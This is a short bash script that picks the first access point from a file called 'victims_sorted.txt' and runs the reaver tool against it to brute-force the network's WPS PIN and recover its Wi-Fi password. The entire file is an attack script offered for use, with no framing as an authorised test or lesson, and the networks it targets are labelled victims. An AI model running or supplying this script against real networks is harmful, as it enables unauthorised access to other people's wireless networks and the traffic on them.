#!/bin/bash
#
# Recover the password from the first network
#

echo Starting reaver

BSSID=`cat victims_sorted.txt|sed 1d|head -1|awk '{print $1}'`
CHANNEL=`cat victims_sorted.txt|sed 1d|head -1|awk '{print $2}'`
ESSID=`cat victims_sorted.txt|sed 1d|head -1|awk '{print $6}'`

echo NETWORK SELECTED: $ESSID

sudo reaver -i en1 -b $BSSID -d 10 -S -N -vv
